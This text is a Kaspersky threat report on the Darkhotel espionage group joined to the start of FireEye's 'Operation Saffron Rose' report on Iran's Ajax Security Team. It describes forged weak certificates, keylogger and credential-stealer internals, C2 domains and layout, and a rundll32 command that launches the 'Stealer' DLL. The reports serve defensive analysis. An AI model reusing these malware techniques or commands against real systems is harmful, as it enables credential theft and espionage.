GTE            Cybertrust            stfmail.ccn.ac.uk sha1/      Invalid Sig .    11/12/2008    11/12/2011
CyberTrust     Educational CA        RSA ( 512 bits )
GTE            Digisign Server ID    webmail.jaring.my sha1/ Invalid Sig         6/1/2009      6/1/2011
CyberTrust     ( Enrich )              RSA ( 512 bits )
GTE            Cybertrust            skillsforge.londonmet .       Invalid Sig     1/16/2009     1/16/2012
CyberTrust     Educational CA        ac.uk
sha1/RSA ( 512 bits )
GTE            Digisign Server ID    anjungnet.mardi.gov . my      Invalid Sig     9/29/2009     9/29/2011
CyberTrust     ( Enrich )              sha1/RSA ( 512 bits )
GTE            Anthem Inc             dl­ait­middleware@an        Invalid Sig     4/22/2009     4/22/2010
CyberTrust     Certificate Authority them.com
sha1/RSA ( 512 bits )
GTE            Cybertrust            ad­idmapp.cityofbrist        Invalid Sig     9/11/2008     9/11/2011
CyberTrust     Educational CA        ol.ac.uk
sha1/RSA ( 512 bits )
Verisign       Verisign Class 3      secure2.eecu.com sha1/ Invalid Sig          10/25/2009    10/26/2010
Secure OFX CA G3      RSA ( 512 bits )
Root Agency Root Agency             Microsoft                    Invalid Sig     6/9/2009      12/31/2039
md5/RSA ( 1024 bits )
TLP : Green 	                         For any inquiries , please contact intelreports@kaspersky.com
11
Subordinate
CA Root        CA / Issuer        Owner                       Status         Valid From    Valid To
GTE            CyberTrust       trainingforms.syniverse .    Invalid Sig    2/17/2009     2/17/2011
Cybertrust     SureServer CA    com
sha1/RSA ( 512 bits )
All related cases of signed Darkhotel malware share the same Root Certificate
Authority and Intermediate Certificate Authority that issued certificates with
weak md5 keys ( RSA 512 bits ) . We are confident that our Darkhotel threat actor
fraudulently duplicated these certificates to sign its malware . These keys were
not stolen . Many of the certificates were noted in a 2011 Fox­IT post “ RSA­512
Certificates Abused in the Wild ” .
To further support this speculation please note the non­specific Microsoft Security
Advisory below , the Mozilla advisory addressing the issue at the time , and the
Entrust responses .
From Microsoft ’s security advisory from Thursday , November 10 , 2011 :
“ Microsoft is aware that DigiCert Sdn . Bhd , a Malaysian subordinate certifica-
tion authority ( CA ) under Entrust and GTE CyberTrust , has issued 22 certifi-
cates with weak 512 bit keys . These weak encryption keys , when broken , could
allow an attacker to use the certificates fraudulently to spoof content , perform
phishing attacks , or perform man­in­the­middle attacks against all Web browser
users including users of Internet Explorer . While this is not a vulnerability in a
Microsoft product , this issue affects all supported releases of Microsoft Windows .
There is no indication that any certificates were issued fraudulently . Instead ,
cryptographically weak keys have allowed some of the certificates to be dupli-
cated and used in a fraudulent manner .
Microsoft is providing an update for all supported releases of Microsoft Windows
that revokes the trust in DigiCert Sdn . Bhd . The update revokes the trust of the
following two intermediate CA certificates : Digisign Server ID – ( Enrich ) , issued by
Entrust.net Certification Authority ( 2048 ) Digisign Server ID ( Enrich ) , issued by
GTE CyberTrust Global Root ”
From Mozilla ’s 2011 response :
“ While there is no indication they were issued fraudulently , the weak keys have
allowed the certificates to be compromised . Furthermore , certificates from this
CA contain several technical issues . They lack an EKU extension specifying their
intended usage and they have been issued without revocation information . ”
TLP : Green 	                    For any inquiries , please contact intelreports@kaspersky.com
12
From Entrust ’s response :
“ There is no evidence that the Digicert Malaysia certificate authorities have been
compromised . ”
Cracking the keys
Here are some notes on the costs and technical requirements of attacking these
certificates .
The computing power required to crack and factor an RSA 512 bit key was $ 5000
and the period of time required was about 2 weeks . ( see http://lukenotricks .
blogspot.co.at/2010/03/rsa­512­factoring­service­two­weeks.html )
In October 2012 , Tom Ritter reported that it would cost about $ 120­-$150 , per-
haps even as little as $ 75 .
Going even further back , there was much discussion about the technical meth-
ods of cracking these keys :
DJ Bernstein ’s 2001 paper on building a machine reducing the cost of integer
factorization with Number Field Sieve techniques , breaking 1024 bit RSA keys .
RSA ’s reaction and 2002 statement on whether or not 1024 bit RSA keys are
broken : “ NIST offered a table of proposed key sizes for discussion at its key man-
agement workshop in November 2001 [ 7 ] . For data that needs to be protected no
later than the year 2015 , the table indicates that the RSA key size should be at
least 1024 bits . For data that needs to be protected longer , the key size should be
at least 2048 bits . ”
Other Tapaoux Certificates
Recent Tapaoux attacks and backdoors include malware signed with strong
SHA1/RSA 2048 bit certificates , suggesting certificate theft .
Subordinate
CA Root        CA / Issuer         Owner                Status        Valid From     Valid To
thawte         thawte Primary    Xuchang Hongguang Revoked         7/18/2013      7/16/2014
Root CA           Technology Co.,Ltd .
sha1/RSA ( 2048bits )
thawte         thawte Primary    Ningbo Gaoxinqu         Revoked    11/5/2013      11/5/2014
Root CA           zhidian Electric Power
Technology Co. , Ltd.
sha1/RSA ( 2048bits )
TLP : Green 	                     For any inquiries , please contact intelreports@kaspersky.com
13
Enhanced Keyloggers and Development
One of the most interesting components that we discovered as a part of this cam-
paign was the use of a digitally­signed advanced keylogger . It is clean , well­written ,
kernel level malcode . The languages of its strings are a mix of English and Korean . It
is signed with the familiar “ belinda.jablonski@syniverse.com ” digital certificate .
This keylogger is dropped by code running within svchost.exe on WinXP SP3 ,
which maintains an interesting debug string :
d:\KerKey\KerKey(일반)\KerKey\release\KerKey.pdb
Note 일반 means “ General ” in Korean
It probably was developed as a part of a mid - to - late 2009 project :
e:\project\2009\x\total_source\32bit\ndiskpro\src\ioman.c
Keylogger Code
This driver package is built to resemble a legitimate low - level Microsoft system
device . It is installed as a system kernel driver “ Ndiskpro ” service , described as
a “ Microcode Update Device ” . It is slightly surprising that no rootkit functionality
hides this service :
When loaded , the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff , and
retrieves keystroke data directly from port 0x60 , the motherboard keyboard con-
troller itself . It buffers , then communicates logged user data to the running user
mode component . This component then encrypts and writes the retrieved values
ondisk to a randomly named .tmp , file like ffffz07131101.tmp . This file is located
in the same directory as the original dropper , which maintains persistence across
reboots with a simple addition to the HKCU run key .
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
14
This keylogger module encrypts and stores gathered data in a log file , as men-
tioned previously . Its encryption algorithm is similar to RC4 . The interesting part is
that the module randomly generates the key and stores it in an unexpected place :
in the middle of the log file name . Hence , the numeric part of the filename is used
as a seed for the pseudorandom number generator . The rand function is statically
linked to ensure same results on different computers .
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
15
Interesting Malware Components
The Darkhotel toolset consists of multiple components that have been slightly
modified over time . These tools are dropped by hotel installers spoofing legiti-
mate software installers , bound within torrent bundles , or dropped by exploits or
hypertext linked from spear - phishing emails .
More advanced tools , like the keylogger decribed above , are later downloaded to
the victim system by one of these implants . In a recent case , word docs embed-
ded with 0-day flash swf files either dropped these backdoors or downloaded and
executed backdoors from remote web servers . These tools pull down the keylog-
ger , steal information from the system , or download other tools .
• 	  small downloader
• 	  information stealer
• 	  Trojan
• 	  dropper and self­injector
• 	  selective infector
The most interesting behaviors of these components include
• 	  highly unusual conditional 180 day command and control communications
delay
• 	  self­kill routines when the system default codepage is set to Korean
• 	  enhanced Microsoft IntelliForm authentication theft handling
• 	  infostealer module Internet Explorer , Firefox , and Chrome support
• 	  campaign or stage ID maintenance
• 	  virtual machine execution sensitivity
• 	  selective viral infection routines to focus the spread of malware within organi-
zations
• 	  signed malcode ( previously noted )
Small Downloader
This module is quite small ( 27Kb ) and comes as a part of WinRar SFX file that drops
and starts the module from % APPDATA%\Microsoft\Crypto\DES64v7\msieckc.exe .
This module is designed to update malicious components through recurring checks
at the C&C server . It is also capable of removing some older components , the names
of which are hardcoded in the body of the malware . The module adds autorun registry
settings to enable an automatic start during system boot .
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
16
One of the most interesting functions of this executable is its unusual delay and
persistence . If a special file exists on the system , the module will not start calling
back to C&C server until the special file is 180 days old . So , if some other critical
malicious component was removed during this period , current module backs up
and restores access to the system within 6 months .
The component gathers system information and sends it to the Darkhotel com-
mand and control servers as detailed in Appendix D.
Information Stealer
This module is relatively large ( 455Kb ) and comes as a part of a WinRar SFX file
that drops and starts the module from % APPDATA%\Microsoft\Display\DmaUp3 .
exe . The main purpose of the module is to collect various secrets stored on a lo-
cal system and upload them to Darkhotel command and control servers :
• 	    Cached passwords from Internet Explorer 6/7/8/9 ( Windows Protected Storage )
• 	    Mozilla Firefox stored secrets ( < 12.0 )
• 	    Chrome stored secrets
• 	    Gmail Notifier credentials
• 	    Intelliform­handled data and credentials :
◦◦ Twitter
◦◦ Facebook
◦◦ Yandex
◦◦ Qip
◦◦ Nifty
◦◦ Mail.ru
◦◦ 126.com email
◦◦ Zapak
◦◦ Lavabit ( encrypted email service now shut down )
◦◦ Bigstring
◦◦ Gmx
◦◦ Sohu
◦◦ Zoho
◦◦ Sina
◦◦ Care2
◦◦ Mail.com
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
17
◦◦ Fastmail
◦◦ Inbox
◦◦ Gawab ( middle­eastern email service )
◦◦ 163.com
◦◦ Lycos
◦◦ Lycos mail
◦◦ Aol login
◦◦ Yahoo ! logins
◦◦ Yahoo ! Japan logins
◦◦ Microsoft Live logins
◦◦ Google login credentials
This module is designed to terminate itself on Windows with the system de-
fault codepage set to Korean .
Trojan . Win32.Karba.e
This malware is 220Kb in size . It was built as MFC framework application with a
lot of extra calls that should have complicated the analysis of the sample . It mim-
ics a GUI desktop application but it does not create any visible windows or dialogs
to interact with local users . The Trojan collects data about the system and anti­
malware software installed on it , and uploads that data to Darkhotel command
and control servers . More technical details are provided in Appendix D.
Trojan - Dropper & Injector ( infected legitimate files )
This malware is 63 kb in size . It is bound to a variety of other software packages
that vary in name , but the host package is consistently detected as “ Virus . Win32 .
Pioneer.dx ” . It drops the igfxext.exe “ selective infector ” component to disk and
runs it .
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
18
Selective Infector
This component is a virus , and is used to selectively infiltrate into other comput-
ers via USB or network shares .
First , the virus retrieves all available disks and starting from disk number 4 ( D:\ )
to disk number 20 ( Z:\ ) , finds executable files and infects them . The code simply
brute forces the list of mapped removable drives .
During its infection routine , the infector changes the entrypoint of executable
files , creates an .rdat section , and inserts a small loader in the section , then puts
its main payload in the overlay . Every infected file has functionality described in
Trojan­Dropper & Injector section , so it can collect information about the comput-
er , send it to the C2 and download other Darkhotel components as commanded .
Observed downloaded components are signed with a familiar expired certificate
from www.esupplychain.com.tw , issued by Cybertrust SureServer CA .
Again , further technical details are provided in Appendix D.
Campaign Codes
Almost every backdoor in this set maintains an internal campaign code or i d , used
in initial c2 communications as described above . Some IDs appear to be related to
geographic interests , others do not seem obvious . We gathered a list of Darkhotel
campaign IDs shown below . Internal IDs and c2 resources overlap across these com-
ponents , there is no pattern of distribution according to connectback resources . The
most common i d is “ DEXT87 ” :
DEXT87                                  NKstep2-auto
step2-auto                               PANA(AMB)-auto
dome1-auto                                 PANA#MERA
step2-down                                 SOYA#2-auto
Java5.22                                 step2-down - u
C@RNUL - auto                             ( ULT)Q5SS@E.S - down
dome - down                                    VER1.5.1
M1Q84K3H                                      VICTORY
NKEX#V1.Q - auto                                WINM#V1.Q
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
19
Infrastructure and Victims
This infrastructure team appears to employ a lesser skillset than top notch
campaigns , maintaining weak server configurations with limited monitoring and
defensive reactions , and making some simple mistakes . However , they are ef-
fective at maintaining a fully available infrastructure to support new and existing
infections .
Overall , victims in our sinkhole logs and KSN data were found across the globe ,
with the majority in Japan , Taiwan , China , Russia , Korea and Hong Kong .
Sinkhole Domains
The following C&C domains have been sinkholed and redirected to the Kaspersky
Sinkhole Server
42world.net                                   jpnspts.biz
academyhouse.us                               jpqueen.biz
adobeplugs.net                                mechanicalcomfort.net
amanity50.biz                                 micromacs.org
autocashhh.hostmefree.org                     ncnbroadcasting.reportinside.net
autochecker.myftp.biz                         neao.biz
autoshop.hostmefree.org                       private.neao.biz
autoupdatfreeee.coolwwweb.com                 reportinside.net
checkingvirusscan.com                         self­-makeups.com
dailyissue.net                                self-­makingups.com
dailypatch­-rnr2008.net                       sourcecodecenter.org
fenraw.northgeremy.info                       support­forum.org
generalemountina.com                          updatewifis.dyndns­-wiki.com
goathoney.biz
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
20
Victim Locations - KSN and Sinkhole Data
KSN Data
Our Kaspersky Security Network detected Darkhotel infections across thousands
of machines , mostly related to the Darkhotel p2p campaigns . These geolocation
estimates probably provide the most accurate picture of where Darkhotel activity
is occurring .
TLP : Green 	               For any inquiries , please contact intelreports@kaspersky.com
21
Here is a pie chart to better visualize the proportions of attack activity throughout
the world . As you can see , over 90% of it occurs in the top five countries : Japan ,
followed by Taiwan , China , Russia and Korea .
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
22
Sinkhole Data
Because the operators very actively build up new command and control serv-
ers , it is difficult to sinkhole enough domains to get an accurate overall picture
of victim system location based on this data . Also , many researcher systems are
connected to the sinkholed domains . However , this graph of current sinkhole
callbacks presents a low confidence distribution of victim geolocation , with India ,
Japan , Ireland , Korea , China and Taiwan in the top slots . Removing India and
Ireland , the set more closely matches our KSN data .
Available ddrlog Victim Data
Many of these c2s maintain a common directory path that serves a ddrlog . The
ddrlogs appear to maintain callback data that the attackers want to set aside in
error logs . Many of the callback URLs have errors , many are from unwanted IP
ranges , and others are clearly unwanted researcher sandbox system callbacks .
A description of the detailed connectback URL values and their xor / base64
encoding scheme is included in the “ Interesting Malware Trojan . Win32.Karba.e ”
technical notes in Appendix D.
The Darkhotel c2 maintain these directory structures to store and serve ddrlog
content :
• 	  /bin / error / ddrlog
• 	  /patch / error / ddrlog
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
23
The following structures appear to be common across servers , but do not pro-
duce ddrlog and do not maintain an /error/ directory :
• 	  /u2/
• 	  /u3/
• 	  /patch2/
• 	  /major/
• 	  inor/
• 	  /asp/
• 	  /update3/
Two ddrlog files report entries starting January 1 , 2009 at 9:16 a.m.
• 	  autozone.000space.com
• 	  genuinsman.phpnet.us
All of the logs maintain a significant number of entries , almost 50,000 , with a
simple stamp “ B ” or “ L ” . Those records are formatted in the following manner :
2009.01.01 09:16:00 150.70.xxx.xx >
­­ B
2009.01.01 09:16:33 150.70.xxx.xx >
­­ B
2009.01.01 09:14:52 220.108.x.xxx >
­­ L
2009.01.01 09:16:04 112.70.xx.xx >
­­ L
Only 120 IP addresses perform the “ B ” checkin , and 90% of these are from the
range 150.70.97.x . This entire range is owned by Trend Micro in Tokyo , JP .
A handful of the remaining addresses , like 222.150.70.228 , appear to come
from other ranges owned by Trend Micro in JP . One outlier comes from an El Sal-
vadoran ISP , and another is connected to a Japanese ISP . Approximately 20,000
IP addresses perform the “ L ” checkin .
Other ddrlogs may include “ A ” tags as well .
The “ A ” tag labels unwanted checkins from untargeted locations , like Hungary
and Italy . The “ B ” tag labels unwanted checkins from Trend Micro IP ranges .
The “ L ” tag labels unwanted checkins from a variety of ranges , but includes odd
IP like the loopback address , 127.0.0.1 , clearly an error .
Entries in these logs include callback URLs that have spaces and unusual charac-
ters that do not conform to the required base64 character dictionary .
TLP : Green 	                   For any inquiries , please contact intelreports@kaspersky.com
24
C2 Communications and Structure
Typical main page :
For begatrendstone.com , we have the following directory structure :
/bin
­read_i.php ( main C&C script )
­login.php ( unknown , replies “ Wrong ID ( ) ” )
/bin / error ( error logs stored here )
­ddrlog
/bin / tmp
/bin / SElhxxwiN3pxxiAPxxc9
-all.gif
/i
- encrypted stolen victim system content
/L
/f
For auto2116.phpnet.us , we have the following directory structure :
/patch
­chkupdate.php ( main command and control script )
/patch / error
­ddrlog
The group encrypts victim data on their servers with single user / passkey combi-
nations across multiple victims . When an unauthorized user attempts to access a
Darkhotel web interface for victim management without the correct passkey , the
html page and table layout renders properly , but all the data values on the page
are returned as garbled ciphertext .
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
25
Victim Management
New victim systems appear to be systematically vetted . The attackers maintain
a   web interface to vet these new victim systems . The attackers first and foremost
list and sort victim systems according to their latest c2 check­in . Collected data
probably is presented in order of importance :
1 . 	  user ’s logon name
2 . 	  system CPU and OS
3 . 	  “ Ping sec ” , or how far the victim system is from the c2
4 . 	  “ In ” , or the process that the attackers’ dll code executes within
5 . 	  Vac : ? ?
6 . 	  system LAN IP
7 . 	  network WAN IP
Here is an example of one of these web pages :
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
26
Researcher Activity
Clearly , some automated analysis activity involving researchers’ sandbox tools
are filling up these logs . From June 2013 to April 2014 ( approximately an 11
month period ) , in only 15 ddrlog files , we observe almost 7,000 connections from
research sandbox systems . The network connections provide a1= through a3=
values identifying a QEMU based sandbox , all sourced from only 485 WAN IP ad-
dresses . Under 30 lan IPs are recorded , all in the same 172.16.2.14­126 range .
This system(s ) uses a “ Dave ” user account and “ HOME­OFF­D5F0AC ” Windows
system name .
These characteristics correspond with network activity generated by GFI Soft-
ware ’s “ CWsandbox ” tools , now owned by “ ThreatTrack Security ” .
TLP : Green 	               For any inquiries , please contact intelreports@kaspersky.com
27
Conclusions
For the past seven years , a strong threat actor named Darkhotel , also known as
Tapaoux , has carried out a number of successful attacks against a wide range of
victims from around the world . It employs methods and techniques which go well
beyond typical cybercriminal behavior .
The Darkhotel crew ’s skillset allows it to launch interesting cryptographical at-
tacks , for instance factoring 512 bit RSA keys . Its use of 0-days is another indica-
tor of a strong threat actor .
The targeting of top executives from various large companies around the world
during their stay at certain “ Dark Hotels ” is one of the most interesting aspects of
this operation . The exact method of targeting is still unknown - for instance , why
some people are targeted while others are not . The fact that most of the time the
victims are top executives indicates the attackers have knowledge of their victims
whereabouts , including name and place of stay . This paints a dark , dangerous
web in which unsuspecting travelers can easily fall . While the exact reason why
some hotels function as an attacker vector are unknown , certain suspicions ex-
ist , indicating possibly a much larger compromise . We are still investigating this
aspect of the operation and will publish more information in the future .
A further interesting trait is the deployment of multiple types of campaigns , both
targeted and botnet . This is becoming more and more common on the APT scene ,
where targeted attacks are used to compromise high profile victims and botnet
style operations are used for massive surveillance or performing other tasks such
as launching DDoS attacks on hostile parties or simply upgrading victims to more
sophisticated espionage tools .
We expect the Darkhotel crew to continue their activities against DIB , Govern-
ment and NGO sectors . The appendix released with this paper provides technical
indicators of compromise which should help victims identify the malicious traffic
and enable targets to protect themselves better against attack .
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
Kaspersky Lab HQ
39A/3 Leningradskoe Shosse
Moscow , 125212
Russian Federation
more contact details
Tel : 	 + 7 - 495 - 797 - 8700
Fax : 	 +7 - 495 - 797 - 8709
E - mail : 	  info@kaspersky.com
Website : 	  www.kaspersky.com

SPECIAL REPORT
OPERATION
SAFFRON ROSE
2013
Authors : Nart Villeneuve , Ned Moran ,
Thoufique Haq and Mike Scott
SECURITY
REIMAGINED
Fireeye : Operation Saffron Rose 2013
CONTENTS
Introduction ................................................................................................................................................................................................................................................................................................................................................ 2
Background ................................................................................................................................................................................................................................................................................................................................... 2
Attack Vectors ...................................................................................................................................................................................................................................................................................................................................... 4
The “ Stealer ” Malware .................................................................................................................................................................................................................................................................................................... 6
The “ Stealer ” Builder and Tools ......................................................................................................................................................................................................................................................... 11
Command - and - Control Infrastructure .................................................................................................................................................................................................................. 13
Victimology ........................................................................................................................................................................................................................................................................................................................................... 15
Attribution .............................................................................................................................................................................................................................................................................................................................................. 16
Conclusion ................................................................................................................................................................................................................................................................................................................................................ 19
About FireEye , Inc .......................................................................................................................................................................................................................................................................................... 19
1 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
We believe we ’re seeing an evolution and development in Iranian - based cyber activity . In
years past , Iranian actors primarily committed politically - motivated website defacement
and DDoS attacks.1 More recently , however , suspected Iranian actors have destroyed data
on thousands of computers with the Shamoon virus,2 and they have penetrated the Navy
Marine Corps Intranet ( NMCI ) , which is used by the U.S. Navy worldwide.3
In this report , we document the activities of the                                    Background
Ajax Security Team , a hacking group believed to be                                   The transition from patriotic hacking to cyber
operating from Iran . Members of this group have                                      espionage is not an uncommon phenomenon . It
accounts on popular Iranian hacker forums such as                                    typically follows an increasing politicization within
ashiyane[.]org and shabgard[.]org , and they have                                     the hacking community , particularly around
engaged in website defacements under the group                                       geopolitical events . This is followed by increasing
name “ AjaxTM ” since 2010 . By 2014 , the Ajax                                          links between the hacking community and the
Security Team had transitioned from performing                                       state , particularly military and/or intelligence
defacements ( their last defacement was in                                            organizations .
December 2013 ) to malware - based espionage ,
using a methodology consistent with other                                            In the late 1990 ’s and early 2000 ’s , a similar
advanced persistent threat actors in this region .                                    transition occurred within the Chinese hacking
community . During that time period , the Chinese
It is unclear if the Ajax Security Team operates in                                  hacking community engaged in website
isolation or if they are a part of a larger                                          defacements and denial of service attacks in
coordinated effort . The Ajax Security Team itself                                    conjunction with incidents such as the accidental
uses malware tools that do not appear to be                                          bombing of the Chinese embassy in Belgrade in
publicly available . We have seen this group                                          1999 , the collision of a U.S. spy plane and a
leverage varied social engineering tactics as a                                      Chinese military plane in 2001 , and the Japanese
means to lure their targets into infecting                                           Prime Minister ’s controversial visit to the
themselves with malware . Although we have not                                        Yasukuni shrine in 2005.4 Around this time a
observed the use of exploits as a means to infect                                    significant shift in philosophy began to take place .
victims , members of the Ajax Security Team have
previously used publicly available exploit code in                                   Members of the Chinese hacking community that
web site defacement operations .                                                      participated in such attacks soon found that
transitioning to cyber espionage was more
In sum , FireEye has recently observed the Ajax                                       rewarding — both in terms of developing a more
Security Team conducting multiple cyber                                              advanced skill set as well as in monetary
espionage operations against companies in the                                        remuneration . One group known as NCPH
defense industrial base ( DIB ) within the Unites                                      ( Network Crack Program Hacker ) , whose
States , as well as targeting local Iranian users of                                  founding member “ Wicked / Withered Rose ” was a
anti - censorship technologies that bypass Iran ’s                                      patriotic hacker , made the transition to cyber
Internet filtering system .                                                           espionage by founding a “ hacker - for - hire ” group
1 HP Security Research . “ Threat Intelligence Briefing Episode 11 ” . February 2014 .
2 Perlroth , N. “ In Cyberattack on Saudi Firm , U.S. Sees Iran Firing Back ” . October 2012 .
3 Gallagher , S. “ Iranians hacked Navy network for four months ? Not a surprise ” . February 2014 .
4 Key . “ Honker Union of China to launch network attacks against Japan is a rumor ” . September 2010 .
2 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
that simultaneously developed an association with                                   Foreign news and opposition websites are
the Chinese military.5 The group began developing                                   routinely blocked in Iran , as are the tools that
zero - day exploits , rootkits and remote access                                       allow users in Iran to bypass these restrictions.11
tools ( RATs)—using them in attacks against a                                        One of the key stakeholders in Iran ’s Internet
variety of targets including the U.S. Department of                                 censorship program is the Iranian Revolutionary
Defense.6 ( One of this group ’s associates , “ whg ” , is                                Guard Corps ( IRGC ) , under which the Basij
still active and is believed to have developed one                                  paramilitary organization operates .
variant of the PlugX / SOGU malware.7 ) The
rationale behind this transition within the Chinese                                 The Basij formed the Basij Cyber Council and
hacking community is nicely summed up in a                                          actively recruits hackers in order to develop both
message by the “ Honker Union of China ” to its                                       defensive and offensive cyber capabilities.12 There
members in 2010 :                                                                    is increasing evidence to suggest that the hacker
community in Iran is engaged in a transition from
What benefit can hacking a Web page bring our                                       politically motivated defacements and denial of
country and the people ? It is only a form of                                        service attacks to cyber espionage activities . This
emotional catharsis , please do not launch any                                       model is consistent with the Basij ’s recruitment of
pointless attacks , the real attack is to fatally                                    paramilitary volunteer hackers to “ engage in less
damage their network or gain access to their                                        complex hacking or infiltration operations ” leaving
sensitive information.8                                                             the more technical operations to entities over
which they have increasingly direct control.13
In Iran , the hacking community appears to be
undergoing a similar transformation . While a                                        As such , the capabilities of threat actors operating
variety of Iranian hacker groups had engaged in                                     from Iran have traditionally been considered
politically motivated website defacements , the                                      limited.14 However , the “ Shamoon ” attacks , which
emergence of the “ Iranian Cyber Army ” in 2009                                       wiped computers in Saudi Arabia and Qatar ,
demonstrated “ a concentrated effort to promote                                      indicate an improvement in capabilities.15 And
the Iranian government ’s political narrative                                        unsurprisingly , Iran has reportedly increased its
online”.9 They targeted , among others , news                                         efforts to improve offensive capabilities after
organizations , opposition websites and social                                       being targeted by Stuxnet and Flame.16
media.10 This marked the beginning of a large-
scale cyber offensive against the perceived
enemies of the Iranian government .
5 	    Elegant , S. “ Enemies at The Firewall ” . December 2007 . Dunham , K. & Melnick , J. “ ’Wicked Rose’ and the NCPH Hacking Group ” .
Wikipedia . “ Network Crack Program Hacker Group ” .
6 	    Dunham , K. & Melnick , J. “ ’Wicked Rose’ and the NCPH Hacking Group ” .
7 	    Blasco , J. “ The connection between the Plugx Chinese gang and the latest Internet Explorer Zeroday ” . September 2012 .
8 	    Key . “ Honker Union of China to launch network attacks against Japan is a rumor ” . September 2010 .
9 	    OpenNet Initiative . “ After the Green Movement : Internet Controls in Iran 2009 – 2012 ” . February 2013 .
10 	  Rezvaniyeh , F. “ Pulling the Strings of the Net : Iran ’s Cyber Army ” . February 2010 . “ Twitter hackers appear to be Shiite group ” . December 2009 .
11 	  OpenNet Initiative . “ Iran ” . June 2009 .
12 	  The IRGC has also indicated that they would welcome hackers that support the Iranian government . Esfandiari , G.
“ Iran Says It Welcomes Hackers Who Work For Islamic Republic ” . March 2011 , HP Security Research .
“ Threat Intelligence Briefing Episode 11 ” . February 2014 .
13 	  BBC Persian . “ Structure of Iran ’s Cyber Warfare ” .
14 	  Mandiant . “ M - Trends : Beyond the Breach , 2014 ” , page 9 . April 2014 .
15 	  Mount , M. “ U.S. Officials believe Iran behind recent cyber attacks ” . October 2012 .
16 	  Shalal - Esa , A. “ Iran strengthened cyber capabilities after Stuxnet : U.S. general ” . January 2013 , Lim , K. “ Iran ’s cyber posture ” . November 2013 .
3 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
Attack Vectors                                                                  registered the domain “ aeroconf2014[.]org ” in
We have observed the Ajax Security Team use a                                   order to impersonate the IEEE Aerospace
variety of vectors to lure targets into installing                              conference — the conference ’s actual domain is
malicious software and/or revealing login                                       aeroconf.org—and sent out an email with the
credentials . These attack vectors include sending                               following information :
email , private messages via social media , fake login
pages , and the propagation of anti - censorship                                   From : invite@aeroconf2014[.]org
software that has been infected with malware .                                   Subject : IEEE Aerospace Conference 2014
Spear phishing                                                                  The email encouraged users to visit a fake
During our investigation , we discovered that these                              conference website owned by the attackers :
attackers sent targeted emails , as well as private
messages through social media . For example , the                                 Upon visiting the website , visitors were notified
attackers targeted companies in the DIB using a                                 that they must install “ proxy ” software in order to
fake conference page as a lure to trick targets into                            access it , which is actually malware .
installing malicious software . The attackers
Figure 1 : The Fake
IEEE Aerospace
Conference Website
7
Bloomberg . “ Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data . ” February 2014 .
4 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
Credential Phishing                                                                    political opposition.18 In response to these
The attackers have also used phishing attacks , in                                      restrictions , Iranians have been increasingly using
which they set up Web pages to emulate various                                         software that bypasses such filtering technology .
services that require security credentials . The
attackers tailored these login pages for specific                                      To counter anti - censorship efforts , Iran has
targets in the DIB and spoofed a variety of services                                   attempted to block the use of certain software
such as Outlook Web Access and VPN login pages .                                        tools.19 In 2012 , researchers found that an
anti - censorship tool that is primarily used by
If users attempt to login through these fake Web                                       Internet users in Iran was bundled with malware
pages , the attackers collect their login credentials .                                  and redistributed.20
Anti - censorship Tools                                                                  Our investigation found that malware - laden
All Internet Service Providers ( ISPs ) in Iran are                                      versions of legitimate anti - censorship software ,
required to implement filtering technology that                                        such as Psiphon and Ultrasurf , were distributed to
censors access to content which the Iranian                                            users Iran and Persian speaking people around the
government deems unacceptable.17 This content                                          world .
includes categories such as pornography and
Figure 2 : The Fake Outlook
Web Access page
17 OpenNet Initiative . “ Iran ” . June 2009 .
18 OpenNet Initiative . “ After the Green Movement : Internet Controls in Iran 2009 – 2012 ” . February 2013 .
19 Torbati , Y. “ Iran blocks use of tool to get around Internet filter ” . March 2013 .
20 Marquis - Boire , M. “ Iranian anti - censorship software ‘ Simurgh’ circulated with malicious backdoor ” . May 2012 .
5 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
The “ Stealer ” Malware                                         The IntelRS.exe is written in .NET and is aptly
Host - based Indicators and Malware                             named “ Stealer ” , as it has various data collection
Functionality                                                 modules . It drops and launches AppTransferWiz.dll
We have observed the Ajax Security Team use a                 via the following command :
malware family that they identify simply as ‘ Stealer’.
They deliver this malware as a malicious executable           “ C:\WINDOWS\system32\rundll32.exe ” “ C:\
( dropper ) . The executable is a CAB extractor that             Documents and Settings\{USER}\Application
drops the implant IntelRS.exe . This implant , in turn ,
drops various other components into C:\                       Data\IntelRapidStart\AppTransferWiz.dll”,#110
Documents and Settings\{USER}\Application
Data\IntelRapidStart\. The following files are                110 is an ordinal that corresponds to “ StartBypass ”
written to disk in this location :                             export in AppTransferWiz.dll .
File                                                Functionality
IntelRS.exe              Various stealer components and encryption implementation
DelphiNative.dll         Browser URL extraction , IE Accounts , RDP accounts ( Imported by IntelRS.exe )
IntelRS.exe.config       Config containing supported .NET versions for IntelRS.exe
AppTransferWiz.dll       FTP exfiltration ( Launched by IntelRS.exe )
RapidStartTech.stl       Base64 encoded config block containing FTP credentials , implant name , decoy name , screenshot
interval and booleans for startup , keylogger and screenshot
Figure 3 : StartBypass
Ordinal
6 www.fireeye.com
Fireeye : Operation Saffron Rose 2013
Data exfiltration is conducted over FTP by               • 	    Takes various screenshots
AppTransferWiz.dll , which acts as an FTP client .
This DLL is written in Delphi . There is code to          • 	    Harvests instant messaging ( IM ) account
exfiltrate data over HTTP POST as well , but it is             information : GTalk , Pidgin , Yahoo , Skype
unused . We also found incomplete code that would
perform SFTP and SMTP exfiltration , which could          • 	    Tracks credentials , bookmarks and history
be completed in a future version .                             from major browsers : Chrome , Firefox , Opera
State is maintained between the stealer                  • 	    Collects email account information
component IntelRS.exe and the FTP component
